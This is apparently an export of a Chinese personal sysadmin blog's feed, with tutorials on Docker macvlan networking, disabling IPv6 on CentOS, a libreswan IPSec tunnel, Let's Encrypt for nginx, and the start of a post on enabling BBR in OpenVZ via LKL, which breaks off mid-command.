<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum downgrade openscap;</span><br><span class="line"><span class="comment"># 也许CentOS6的版本太高，需要降级到upg的版本</span></span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://wiki.centos.org/TipsAndTricks/CentOSUpgradeTool" target="_blank" rel="noopener">CentOS upgradetool</a></li>
</ul>
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>tips</tag>
        <tag>upgradetool</tag>
        <tag>upgrade</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7下docker用原生方法使用宿主机所在网络</title>
    <url>/2016/08/CentOS7%E4%B8%8Bdocker%E7%94%A8%E5%8E%9F%E7%94%9F%E6%96%B9%E6%B3%95%E4%BD%BF%E7%94%A8%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%89%80%E5%9C%A8%E7%BD%91%E7%BB%9C/index.html</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><strong>docker</strong>以前的版本不支持直接配置宿主机所在网段ip并跟其直接互通的功能，当然，也可以实现这个功能，只是有点绕，而且还有一些第三方工具例如<strong>pipework</strong>把这些琐碎的过程封装起来，让步骤简化。但是，现在不需要了，现在<em>1.12</em>的<strong>docker</strong>已经直接支持了直接使用宿主机所在网段资源。</p>
<a id="more"></a>
<h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>宿主机一台<ul>
<li>CentOS 7.x</li>
<li>eth0 配 ip 地址：10.0.0.2/24</li>
<li>缺省网关：10.0.0.1</li>
</ul>
</li>
</ul>
<p>在宿主机上安装软件，执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install kernel; <span class="comment"># 更新到最新的kernel版本</span></span><br><span class="line">yum -y update; <span class="comment"># 更新到最新的CentOS7.x</span></span><br><span class="line">tee /etc/yum.repos.d/docker.repo &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">[dockerrepo]name=Docker Repository</span><br><span class="line">baseurl=https://yum.dockerproject.org/repo/main/centos/7/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://yum.dockerproject.org/gpg</span><br><span class="line">EOF</span><br><span class="line">    </span><br><span class="line">yum -y install docker-engine; <span class="comment"># 安装docker最新版</span></span><br><span class="line">systemctl start docker.service; <span class="comment"># 启动docker</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker.service; <span class="comment"># 使docker服务随着机器启动而启动</span></span><br></pre></td></tr></table></figure>
<h2 id="网络创建"><a href="#网络创建" class="headerlink" title="网络创建"></a>网络创建</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network create -d macvlan \</span><br><span class="line">        --subnet=10.0.0.0/24 \</span><br><span class="line">        --gateway=10.0.0.1 \</span><br><span class="line">        -o parent=eth0 MACNET;</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ol>
<li>这里的<em>macvlan</em>是kernel的模块名，docker 1.12 开始支持其作为驱动来创建网络</li>
<li>这里的<em>10.0.0.0/24</em>是宿主机所在网络的网段</li>
<li><em>10.0.0.1</em>是网关</li>
<li><em>eth0</em>是宿主机接入<em>10.0.0.0/24</em>的网络设备</li>
</ol>
<h2 id="创建实例"><a href="#创建实例" class="headerlink" title="创建实例"></a>创建实例</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --net=MACNET \</span><br><span class="line">          --ip=10.0.0.11 \</span><br><span class="line">          -it \</span><br><span class="line">          --rm alpine /bin/sh;</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ul>
<li><em>10.0.0.11</em>是新docker实例的ip地址</li>
</ul>
<h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>在刚起来的这个 docker 实例里执行测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping -c 5 10.0.0.1;</span><br></pre></td></tr></table></figure>
<p>显示能通，证明能通网关。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping -c 5 10.0.0.2;</span><br></pre></td></tr></table></figure>
<p>显示不能通，证明能通宿主机在同一网段的 ip。</p>
<p>在宿主机外同网段其他机器上执行测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping -c 5 10.0.0.11;</span><br></pre></td></tr></table></figure>
<p>ping docker 实例能通。</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ul>
<li>这样配出来的 docker 实例跟现有网络是完全联通的</li>
<li>但是：跟宿主机在现有网络的 ip 地址不通</li>
</ul>
<h1 id="其他维护命令"><a href="#其他维护命令" class="headerlink" title="其他维护命令"></a>其他维护命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network ls; <span class="comment"># 显示现有network</span></span><br><span class="line">docker network rm MACVLAN; <span class="comment"># 删除掉前面建立的MACVLAN的网络</span></span><br></pre></td></tr></table></figure>
<h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><p>Q: 为嘛这里的<em>docker</em>不支持<em>ipvlan</em>的驱动呢？<br>A: 因为官方资料显示kernel <em>4.2</em>以上才支持<em>ipvlan</em>(虽然准确讲4.2之前也有支持，但是有bug)，而从<em>3.9</em>就开始支持<em>macvlan</em>了。</p>
<p>Q: 为嘛<em>RedHat</em>这么喜欢把高版本的功能backport到老版本的操行，却没有把<em>ipvlan</em>的支持backport到<em>3.10</em>(CentOS 7.x的kernel版本)呢？<br>A: 。。。zzzzzzZZZZZZZZZ</p>
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>macvlan</tag>
        <tag>ipvlan</tag>
        <tag>pipework</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS下怎样干掉IPv6</title>
    <url>/2016/08/CentOS%E4%B8%8B%E6%80%8E%E6%A0%B7%E5%B9%B2%E6%8E%89IPv6/index.html</url>
    <content><![CDATA[<h1 id="什么是IPv6"><a href="#什么是IPv6" class="headerlink" title="什么是IPv6"></a>什么是IPv6</h1><p><strong>Internet Protocol version 6</strong> (简称<strong>IPv6</strong>) 是 <a href="https://en.wikipedia.org/wiki/Internet_Protocol" target="_blank" rel="noopener">Internet Protocol（互联网协议）</a> (IP)的最新一个版本，IPv6主要是为了解决IPv4地址枯竭的问题而开发的，目的是为了替换当前所用的IPv4。</p>
<p>虽然IPv6天生是为了替代IPv4的（生而自豪），而且最近几年IPv4地址也已然分配完，但是由于NAT这种技术的存在，使得IPv6还没有真正意义上的”取代”IPv4。尤其是在“我大宋”，除了教育网有IPv6的环境以外，其他基本都不支持IPv6。不过国外貌似发展的还可以，好些运营商都已经开始支持IPv6了。<br><a id="more"></a></p>
<h1 id="IPv6的毛病"><a href="#IPv6的毛病" class="headerlink" title="IPv6的毛病"></a>IPv6的毛病</h1><p>毛病？IPv6其实没毛病，而且作为要替换IPv4的下一代协议，优点还很多。：）只是因为我们身处天朝上国，网络根本就不支持IPv6，所以即使Linux系统缺省就支持IPv6，作为崇尚洁癖的系统管理员、运维工程师们，自然是婶婶可以忍，叔叔不可忍！（是可忍，孰不可忍）。</p>
<p>好啦，以上纯属扯蛋，说正经的，刚开始的时候，如果在不支持IPv6的环境里启用IPv6协议的话，是会导致很多性能问题的，但最近些年，各种操作系统也做了不少调整，到目前其实真没发现IPv6会对性能造成多大影响。一个长期以来大家都认可的理由就是：IPv6会优于IPv4，也就是说，一个数据包在发送时首先会先尝试IPv6的网关，然后再是IPv4的。其实就算这种情况是真的，我们也是可以通过<strong>/etc/gai.conf</strong>文件来调整的。</p>
<h1 id="几种姿势"><a href="#几种姿势" class="headerlink" title="几种姿势"></a>几种姿势</h1><p>下面介绍几种在Linux系统里干掉IPv6的方法。</p>
<h2 id="sysctl大法"><a href="#sysctl大法" class="headerlink" title="sysctl大法"></a>sysctl大法</h2><p>几乎所有的Linux系统……好吧好吧，我就说我确认的吧，Debian系和RedHat系……算啦，最最最确认的就是CentOS（当然rhel也一样）下，可以在/etc/sysctl.d/目录下新建文件叫ipv6.conf（Linux系统在启动时会自动读取/etc/sysctl.conf以及/etc/sysctl.d/目录下的文件，并用sysctl -p来执行的，这里以.conf为扩展名是为了兼容CentOS7.x的系统，CentOS7.x认的是是“/etc/sysctl.d/<name>.conf”这种文件），文件的内容是：<br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">net.ipv6.conf.all.disable_ipv6</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">net.ipv6.conf.default.disable_ipv6</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure></name></p>
<p>配置完毕如果不重启机器的话，可以直接执行命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -p /etc/sysctl.d/ipv6.conf;</span><br></pre></td></tr></table></figure></p>
<p>强制让其生效。然后再用命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a s;</span><br></pre></td></tr></table></figure></p>
<p>看，会发现原来的很多<em>inet6</em>的地址不存在了，配置生效了！</p>
<p>但需要注意的是：这种方式并没有真正把ipv6模块从内核里清除掉，不信用命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsmod | grep -i ipv6;</span><br></pre></td></tr></table></figure></p>
<p>看，还是会有很多在用ipv6模块的。在这些模块里，又有好些并不是完全依赖ipv6模块不可的，只有极少数的是必须要ipv6模块的，所以，我们可以用后面的方法把ipv6模块以后系统还能正常工作。</p>
<h2 id="modprobe劫持"><a href="#modprobe劫持" class="headerlink" title="modprobe劫持"></a>modprobe劫持</h2><p>此法又称“釜底抽薪”，CentOS7.x下不支持，CentOS6.x下测试可用。具体原理是截获系统自动加载ipv6模块的动作，直接返回true，并且将ipv6模块加入黑名单(blacklist)。这样系统就没法通过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">modprobe ipv6;</span><br></pre></td></tr></table></figure></p>
<p>或<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insmod ipv6;</span><br></pre></td></tr></table></figure></p>
<p>来加载ipv6模块了。具体方法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"install ipv6 /bin/true\nblacklist ipv6"</span> &gt;\</span><br><span class="line">        /etc/modprobe.d/ipv6.conf;</span><br><span class="line">reboot; <span class="comment"># 这种办法必须要重启机器来完全生效</span></span><br></pre></td></tr></table></figure>
<p>机器重启过后再通过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsmod | grep -i ipv6;</span><br></pre></td></tr></table></figure></p>
<p>来看是看不到ipv6模块的，表示ipv6模块已经完全被从内核里除掉。</p>
<h2 id="GRUB参数"><a href="#GRUB参数" class="headerlink" title="GRUB参数"></a>GRUB参数</h2><p>注意：此法仅适用于CentOS7.x！<br>此法的原理是在GRUB里直接将参数”ipv6.disable=1”传递给内核，这样启动时内核会根据这个参数不再加载ipv6模块。<br>具体方法是：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> grep -q <span class="string">"ipv6.disable=1"</span> /etc/default/grub</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"\"ipv6.disable=1\" found in /etc/default/grub"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  sed -i.ori <span class="string">'s/^GRUB_CMDLINE_LINUX="/&amp;ipv6.disable=1 /'</span> /etc/default/grub</span><br><span class="line">  /usr/sbin/grub2-mkconfig -o /boot/grub2/grub.cfg</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 此法自然也需要重启机器，于是：</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure></p>
<h1 id="个人推荐的解决方案"><a href="#个人推荐的解决方案" class="headerlink" title="个人推荐的解决方案"></a>个人推荐的解决方案</h1><ul>
<li>CentOS7.x下慎用GRUB法，因为一旦用GRUB法，以后万一有某个模块需要ipv6，那非重新修改GRUB文件并重启机器不能成功的</li>
<li>CentOS6.x下的话，建议用sysctl法和modprobe法结合，如果碰到有一定要依赖于ipv6的模块要加载，直接修改/etc/modprobe.d/ipv6.conf，注释掉相关语句以后，再重新就能modprobe ipv6了</li>
</ul>
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title>Dig a IPSec&#39;s tunnel between 2 Linux box with one is NATed and has multinets</title>
    <url>/2017/01/Dig-a-IPSec-s-tunnel-between-2-Linux-box-with-one-is-NATed-and-has-multinets/index.html</url>
    <content><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>我司有个域名，被伟大的墙双向认证了，站点如果部署在墙内，墙外过来的访问会被 reset；站点如果部署在墙外，墙内的访问也会被 reset。我司用户主要在墙内，所以，站点自然部署在墙内，但为了让墙外用户也能访问，于是在墙外购置一 VPS，配置 nginx，proxy_pass 到墙内我们真正的服务器上。</p>
<a id="more"></a>
<p>这里有个技术问题：我们的真实服务器都是内网地址，不能通过外网直接访问，所以，需要在墙外的 VPS 上到墙内真实服务器所在网段打一个 net to net 的 tunnel（其实 host to net 的也行，这是主要是考虑到也许以后墙外节点的扩展性问题），而且这个 tunnel 还需要加密，否则过墙的时候肯定会被感知而 reset 掉链接的。于是，我们这里采用的是 IPSec 加密。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>网络拓扑图如下：</p>
<img src="/2017/01/Dig-a-IPSec-s-tunnel-between-2-Linux-box-with-one-is-NATed-and-has-multinets/index/net2net_IPSec_one_NATed_multinets.png" title="[IPSec tunnel 连通网络 A 和网络 B 以及网络 C 的拓扑图]">
<ul>
<li>Server A 直接有公网地址 1.2.3.4，带的私网地址段是 10.0.0.1/24</li>
<li>Server B 只有私网地址 10.0.1.2，通过设备 FW 给 map 了一个公网地址 2.3.4.5</li>
<li>Server C 的缺省网关是设备 R_B&amp;C(10.0.12.253)</li>
<li>Server B 的缺省网关也是设备 R_B&amp;C(10.0.1.253)</li>
<li>路由器 R_B&amp;C 上的路由表里 10.0.0.0/24 的路由指向了 10.0.1.2</li>
</ul>
<h1 id="Howto"><a href="#Howto" class="headerlink" title="Howto"></a>Howto</h1><h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>在 Server A 和 Server B 上分别执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install libreswan;</span><br></pre></td></tr></table></figure>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="Server-A"><a href="#Server-A" class="headerlink" title="Server A"></a>Server A</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt;/etc/ipsec.d/B.conf</span><br><span class="line">config setup</span><br><span class="line">	protostack=netkey</span><br><span class="line"></span><br><span class="line">conn A2B</span><br><span class="line">	left=1.2.3.4</span><br><span class="line">	leftsubnet=10.0.0.0/24</span><br><span class="line">	leftsourceip=10.0.0.1</span><br><span class="line">	right=2.3.4.5</span><br><span class="line">	rightsubnets=&#123;10.0.1.0/24 10.0.12.0/24&#125;</span><br><span class="line">	rightsourceip=10.0.1.2</span><br><span class="line">	authby=secret</span><br><span class="line">	auto=start</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;EOF &gt;/etc/ipsec.d/B.secrets</span><br><span class="line">1.2.3.4 2.3.4.5 : PSK <span class="string">"3.5.7.9"</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># for iptables, eth0 is the public network interface of Server A</span></span><br><span class="line"><span class="keyword">if</span> /etc/init.d/iptables status&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">	iptables -A INPUT -i eth0 -p esp -j ACCEPT;</span><br><span class="line">	iptables -A INPUT -i eth0 -p udp \</span><br><span class="line">		-m udp --sport 500 --dport 500 -j ACCEPT;</span><br><span class="line">	iptables -A INPUT -i eth0 -p udp \</span><br><span class="line">		-m state --state NEW -m udp -m multiport \</span><br><span class="line">		--dports 50,51,500,4500 -j ACCEPT;</span><br><span class="line">	iptables -A INPUT -i eth0 -p tcp \</span><br><span class="line">		-m state --state NEW -m tcp -m multiport \</span><br><span class="line">		--dports 50,51 -j ACCEPT;</span><br><span class="line">	iptables -t nat -I POSTROUTING \</span><br><span class="line">		-s 10.0.0.0/24 -d 10.0.1.0/24 \</span><br><span class="line">		-o eth0 -j RETURN;</span><br><span class="line">	iptables -t nat -I POSTROUTING \</span><br><span class="line">		-s 10.0.0.0/24 -d 10.0.12.0/24 \</span><br><span class="line">		-o eth0 -j RETURN;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">/etc/init.d/ipsec start;</span><br><span class="line">chkconfig ipsec on;</span><br><span class="line">ipsec auto --add A2B;</span><br><span class="line">ipsec auto --up A2B;</span><br></pre></td></tr></table></figure>
<h3 id="Server-B"><a href="#Server-B" class="headerlink" title="Server B"></a>Server B</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt;/etc/ipsec.d/A.conf</span><br><span class="line">config setup</span><br><span class="line">	protostack=netkey</span><br><span class="line"></span><br><span class="line">conn B2A</span><br><span class="line">	left=%defaultroute</span><br><span class="line">	leftid=2.3.4.5</span><br><span class="line">	leftsubnets=&#123; 10.0.1.0/24 10.0.12.0/24 &#125;</span><br><span class="line">	leftsourceip=10.0.1.2</span><br><span class="line">	right=1.2.3.4</span><br><span class="line">	rightsubnet=10.0.0.0/24</span><br><span class="line">	rightsourceip=10.0.0.1</span><br><span class="line">	authby=secret</span><br><span class="line">	auto=start</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;EOF &gt;/etc/ipsec.d/A.secrets</span><br><span class="line">2.3.4.5 1.2.3.4 : PSK <span class="string">"3.5.7.9"</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">/etc/init.d/ipsec start;</span><br><span class="line">chkconfig ipsec on;</span><br><span class="line">ipsec auto --add B2A;</span><br><span class="line">ipsec auto --up B2A;</span><br></pre></td></tr></table></figure>
<h2 id="重要点"><a href="#重要点" class="headerlink" title="重要点"></a>重要点</h2><p>要注意的点在于 Server A 上的 Iptables 配置，这个在当 IPSec server 有自己的公网地址而且还对内提供 SNAT 服务时会保证配置正确。</p>
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>IPSec</tag>
        <tag>tunnel</tag>
        <tag>Libreswan</tag>
        <tag>PSK</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Secure Nginx with Let&#39;s Encrypt on Ubuntu 16.04</title>
    <url>/2017/02/How-To-Secure-Nginx-with-Let-s-Encrypt-on-Ubuntu-16-04/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>想做个微信小程序，把娃们的网站，在微信里展现给老人看，而做微信小程序，要求网站是 https 的，我也舍不得买证书，于是就打算使用 <a href="https://letsencrypt.org/" target="_blank" rel="noopener">Let’s Encrypt</a> 提供的免费证书。</p>
<a id="more"></a>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>Ubuntu 16.04.1 LTS</li>
<li>NGINX 1.10</li>
<li>kernel 4.9.4-040904-generic</li>
</ul>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get -y install letsencrypt;</span><br><span class="line"><span class="comment"># letsencrypt 是 Let's Encrypt 官方软件</span></span><br><span class="line"><span class="comment"># certbot 在 Ubuntu 16.04 上的名字</span></span><br></pre></td></tr></table></figure>
<h2 id="获取证书"><a href="#获取证书" class="headerlink" title="获取证书"></a>获取证书</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">letsencrypt certonly \</span><br><span class="line">	--webroot \</span><br><span class="line">		-w /opt/www/blog.xiaoyuer.cn \</span><br><span class="line">		-d blog.xiaoyuer.cn;</span><br><span class="line">letsencrypt certonly </span><br><span class="line">	--webroot \</span><br><span class="line">		-w /opt/www/blog.lukeyang.us \</span><br><span class="line">		-d blog.lukeyang.us;</span><br><span class="line"><span class="comment"># 这里 blog.xiaoyuer.cn 和 blog.lukeyang.us 是娃的网站</span></span><br><span class="line"><span class="comment"># 其实支持在一条命令里用多个 -w 参数配合 -d 参数，</span></span><br><span class="line"><span class="comment"># 为什么没有这样做而是单独一条命令一个域名这么做呢，</span></span><br><span class="line"><span class="comment"># 主要是不想把所有证书放在一起......</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 获取证书过程中会弹出个窗口让输入邮件地址，</span></span><br><span class="line"><span class="comment"># 输入一个常用的即可</span></span><br></pre></td></tr></table></figure>
<h2 id="Generate-Strong-Diffie-Hellman-Group-optional"><a href="#Generate-Strong-Diffie-Hellman-Group-optional" class="headerlink" title="Generate Strong Diffie-Hellman Group(optional)"></a>Generate Strong Diffie-Hellman Group(optional)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl dhparam -out /etc/ssl/certs/dhparam.pem 2048;</span><br><span class="line"><span class="comment"># 密钥交换时使用更强的 2048 位密钥</span></span><br></pre></td></tr></table></figure>
<h2 id="配置-NGINX-的-ssl-参数（optional）"><a href="#配置-NGINX-的-ssl-参数（optional）" class="headerlink" title="配置 NGINX 的 ssl 参数（optional）"></a>配置 NGINX 的 ssl 参数（optional）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt;/etc/nginx/snippets/ssl-params.conf</span><br><span class="line"><span class="comment"># from https://cipherli.st/</span></span><br><span class="line"><span class="comment"># and https://raymii.org/s/tutorials/Strong_SSL_Security_On_nginx.html</span></span><br><span class="line"></span><br><span class="line">ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">ssl_prefer_server_ciphers on;</span><br><span class="line">ssl_ciphers <span class="string">"EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH"</span>;</span><br><span class="line">ssl_ecdh_curve secp384r1;</span><br><span class="line">ssl_session_cache shared:SSL:10m;</span><br><span class="line">ssl_session_tickets off;</span><br><span class="line">ssl_stapling on;</span><br><span class="line">ssl_stapling_verify on;</span><br><span class="line"><span class="comment">#resolver 8.8.8.8 8.8.4.4 valid=300s;</span></span><br><span class="line"><span class="comment">#resolver_timeout 5s;</span></span><br><span class="line"><span class="comment"># Disable preloading HSTS for now.  You can use the commented out header line that includes</span></span><br><span class="line"><span class="comment"># the "preload" directive if you understand the implications.</span></span><br><span class="line"><span class="comment">#add_header Strict-Transport-Security "max-age=63072000; includeSubdomains; preload";</span></span><br><span class="line">add_header Strict-Transport-Security <span class="string">"max-age=63072000; includeSubdomains"</span>;</span><br><span class="line">add_header X-Frame-Options DENY;</span><br><span class="line">add_header X-Content-Type-Options nosniff;</span><br><span class="line"></span><br><span class="line">ssl_dhparam /etc/ssl/certs/dhparam.pem;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果没有做上一步，最后 ssl_dhparam 那句请注释掉</span></span><br></pre></td></tr></table></figure>
<h2 id="NGINX-的虚拟机配置"><a href="#NGINX-的虚拟机配置" class="headerlink" title="NGINX 的虚拟机配置"></a>NGINX 的虚拟机配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-enabled/blog.xiaoyuer.cn;</span><br></pre></td></tr></table></figure>
<p>在 <em>server {}</em> 配置块中添加如下内容：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">listen</span> <span class="number">443</span> ssl http2 default_server;</span><br><span class="line"><span class="attribute">include</span> snippets/ssl-params.conf;</span><br><span class="line"><span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/blog.xiaoyuer.cn/fullchain.pem;</span><br><span class="line"><span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/blog.xiaoyuer.cn/privkey.pem;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ /.well-known</span> &#123;</span><br><span class="line">	<span class="attribute">allow</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-enabled/blog.lukeyang.us;</span><br></pre></td></tr></table></figure>
<p>在 <em>server {}</em> 配置块中添加如下内容：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line"><span class="attribute">include</span> snippets/ssl-params.conf;</span><br><span class="line"><span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/blog.lukeyang.us/fullchain.pem;</span><br><span class="line"><span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/blog.lukeyang.us/privkey.pem;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ /.well-known</span> &#123;</span><br><span class="line">	<span class="attribute">allow</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<p>这个配置里的 <strong>listen 443 ssl httpd2</strong> 一行并没有 <strong>default_server</strong> 字样，那是一个端口因为只能有一个 <strong>default_server</strong>，前面那个虚机已经在 443 端口上指定了 <strong>default_server</strong>，所以这里不能重复指定了</p>
<h2 id="重启-NGINX-服务"><a href="#重启-NGINX-服务" class="headerlink" title="重启 NGINX 服务"></a>重启 NGINX 服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx.service;</span><br></pre></td></tr></table></figure>
<h2 id="配置自动更新证书"><a href="#配置自动更新证书" class="headerlink" title="配置自动更新证书"></a>配置自动更新证书</h2><p>由于 Let’s Encrypt 的证书会在三个月后过期，但是官方工具提供了自动更新的功能，我们只需要用 cron 定时调用即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt;/etc/cron.d/renew_ssl</span><br><span class="line">25 3 * * 3 root	/usr/bin/letsencrypt renew&gt;/var/<span class="built_in">log</span>/le-renew.log<span class="string">"</span></span><br><span class="line"><span class="string">35 3 * * 3 root	/bin/systemctl reload nginx</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
<p>这里的逻辑是每周（三）检查一次是否需要更新证书，如果需要，则自动更新证书。检查完，再做一次 nginx 的 reload 操作，重新载入新证书（如果有的话）。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-16-04" target="_blank" rel="noopener">How To Secure Nginx with Let’s Encrypt on Ubuntu 16.04</a></li>
</ul>
]]></content>
      <tags>
        <tag>https</tag>
        <tag>ssl</tag>
        <tag>http2</tag>
        <tag>NGINX</tag>
        <tag>Ubuntu</tag>
        <tag>letsencrypt</tag>
        <tag>certbot</tag>
      </tags>
  </entry>
  <entry>
    <title>How to enable BBR in OpenVZ</title>
    <url>/2018/10/How-to-enable-BBR-in-OpenVZ/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>以前有个贪便宜（一年 5 刀）而入手但目前在吃灰中的小鸡，当然是 <strong>OpenVZ</strong>，网络条件很差，用起来很鸡肋，后来看到 <a href="https://github.com/google/bbr" target="_blank" rel="noopener">Google 的 BBR</a> 也有能用在 OpenVZ 的案例，于是也想尝试下，看是否能将其起死回生。<br><a id="more"></a></p>
<h1 id="LKL-大法"><a href="#LKL-大法" class="headerlink" title="LKL 大法"></a>LKL 大法</h1><p><a href="https://lkl.github.io/" target="_blank" rel="noopener">LKL(Linux Kernel Library)</a> 是个有意思的东西，常见的应用场景是把整个 Linux kernel 编成一个动态库，然后用 <strong>LD_PRELOAD</strong> 环境变量将其注入到程序运行之前的环境里，强制让程序里的调用时用新编译的这个 kernel 包中的一些函数。</p>
<p>这样其实就已经解决了 <strong>OpenVZ</strong> 的系统不能升级 kernel 而不能使用 <strong>BBR</strong> 的问题：我可以把新的支持 <strong>BBR</strong> 的 kernel 库完全重新编一个，然后用 <strong>LD_PRELOAD</strong> 注入嘛，完美！</p>
<h1 id="具体命令"><a href="#具体命令" class="headerlink" title="具体命令"></a>具体命令</h1><p>现在开始贴命令，大段的命令，重要的地方我大概会写点注释</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># suppose you are in your home dir: /home/zhangsan</span></span><br><span class="line">wget https://github.com/lkl/linux/archive/master.zip</span><br><span class="line">unzip master.zip</span><br><span class="line"><span class="built_in">cd</span> linux-master</span><br><span class="line">make -C tools/lkl</span><br><span class="line"></span><br><span class="line">sudo su -</span><br><span class="line"><span class="comment"># act as root blow</span></span><br><span class="line">mkdir haproxy</span><br><span class="line">apt-get install haproxy</span><br><span class="line">systemctl stop haproxy</span><br><span class="line">systemctl <span class="built_in">disable</span> haproxy</span><br><span class="line"><span class="built_in">cd</span> haproxy</span><br><span class="line">cp \</span><br><span class="line">  /home/zhangsan/linux-master/tools/lkl/lib/hijack/liblkl-hijack.so 